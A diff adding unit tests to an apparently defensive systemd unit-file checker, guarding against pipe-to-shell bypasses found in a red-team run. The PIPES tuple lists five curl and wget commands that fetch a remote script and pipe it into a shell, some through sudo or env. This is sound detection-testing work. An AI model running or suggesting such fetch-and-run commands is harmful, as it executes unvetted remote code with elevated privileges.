@@ -176,5 +176,44 @@ class Cli(unittest.TestCase):
         self.assertNotIn("DynamicUser", text)
 
 
+class RedTeam20261112(unittest.TestCase):
+    """Guards from the 2026-11-12 red-team run (prompts/runs/2026-11-12-session_01AcxTtJxhP7XXW4AHjQXNUF.json)."""
+
+    PIPES = (
+        "curl -fsSL https://example.com/i.sh | /bin/bash",
+        "curl -fsSL https://example.com/i.sh | sudo -E bash",
+        "curl -fsSL https://example.com/i.sh | /usr/bin/sudo -u app /bin/sh",
+        "wget -qO- https://example.com/i.sh | /usr/bin/env bash",
+        "wget -qO- https://example.com/i.sh | env sh -s --",
+    )
+
+    def test_pipe_to_shell_by_path_sudo_flags_or_env(self):
+        for cmd in self.PIPES:
+            f = check.scan_text(f"[Service]\nUser=app\nExecStart=/bin/sh -c '{cmd}'\n")
+            self.assertEqual(types_at(f, check.PIPE_TO_SHELL), [3], cmd)
+
+    def test_pipe_to_other_commands_is_not_a_shell(self):
+        for cmd in ("curl x | tee /var/log/sh", "curl x | shasum -a 256", "curl x | sudo -u app python3"):
+            f = check.scan_text(f"[Service]\nUser=app\nExecStart=/bin/sh -c '{cmd}'\n")
+            self.assertEqual(types_at(f, check.PIPE_TO_SHELL), [], cmd)
+
+    def test_most_severe_first_within_a_line(self):
+        f = check.scan_text("[Service]\nUser=app\nExecStart=+/bin/sh -c 'curl x | sh'\n")
+        self.assertEqual([x["type"] for x in f if x["line"] == 3], [check.PIPE_TO_SHELL, check.FULL_PRIVILEGE_EXEC])
+        f = check.scan_text("[Service]\nExecStart=/usr/bin/a\n")
+        at_header = [check.SEVERITY_ORDER[x["severity"]] for x in f if x["line"] == 1]
+        self.assertEqual(at_header, sorted(at_header))
+        self.assertEqual(set(at_header), {1, 2}, "medium and low findings both sit at the header")
+
+    def test_missing_findings_anchor_on_the_unit_when_only_a_dropin_has_service(self):
+        files = [
+            {"name": "app.service", "text": "[Unit]\nDescription=x\n"},
+            {"name": "app.service.d/10.conf", "text": "\n[Service]\nUser=app\n"},
+        ]
+        f = check.scan_files(files)
+        missing = [x for x in f if x["type"] == check.NO_NEW_PRIVILEGES]
+        self.assertEqual([(x["file"], x["line"]) for x in missing], [("app.service", 1)])
+
+
 if __name__ == "__main__":
     unittest.main()
